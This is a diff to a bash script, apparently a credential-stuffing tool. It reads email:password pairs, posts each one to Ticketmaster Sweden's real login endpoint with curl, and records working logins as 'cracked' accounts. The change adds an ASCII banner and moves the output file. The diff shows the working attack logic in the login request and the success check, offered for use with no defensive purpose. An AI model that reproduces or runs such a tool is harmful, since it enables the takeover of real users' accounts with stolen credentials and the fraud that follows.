@@ -38,6 +38,18 @@ if [[ ! -d /root/cracked-accounts ]]; then
    mkdir -p /root/cracked-accounts
 fi
 
+header() {
+cat << "EOF" > ~/cracked-accounts/cracked-ticketmaster-passwords.txt
+          _   _      _        _                       _            
+__      _| |_(_) ___| | _____| |_ _ __ ___   __ _ ___| |_ ___ _ __ 
+\ \ /\ / / __| |/ __| |/ / _ \ __| '_ ` _ \ / _` / __| __/ _ \ '__|
+ \ V  V /| |_| | (__|   <  __/ |_| | | | | | (_| \__ \ ||  __/ |    Author: wuseman <wuseman@nr1.nu>
+  \_/\_/  \__|_|\___|_|\_\___|\__|_| |_| |_|\__,_|___/\__\___|_|    Verison: 1.0
+-------------------------------------------------------------------
+EOF
+}
+
+header 
 while read line; do
     MAIL="$(echo $line|awk -F'@' '{print $1}')"
     MAILHOST="$(echo $line|awk -F'@' '{print $2}'|cut -d: -f1)"
@@ -60,7 +72,7 @@ curl -s 'https://www.ticketmaster.se/myAccount/controller/login.php' \
     --data "EMAIL=$MAIL%40$MAILHOST&PASSWORD=$PASSWORD"|grep -q upcomingEvents
 
 if [[ $? -eq "0" ]]; then
-    echo -e "[\e[1;32m>>\e[0m] - Cracked Login: $line" | tee -a ~/cracked-ticketmaster-passwords.txt
+    echo -e "[\e[1;32m>>\e[0m] - Cracked Login: $line" | tee -a ~/cracked-accounts/cracked-ticketmaster-passwords.txt
 else
     echo -e "[\e[1;31m<<\e[0m] - Failed Login $line"
 fi
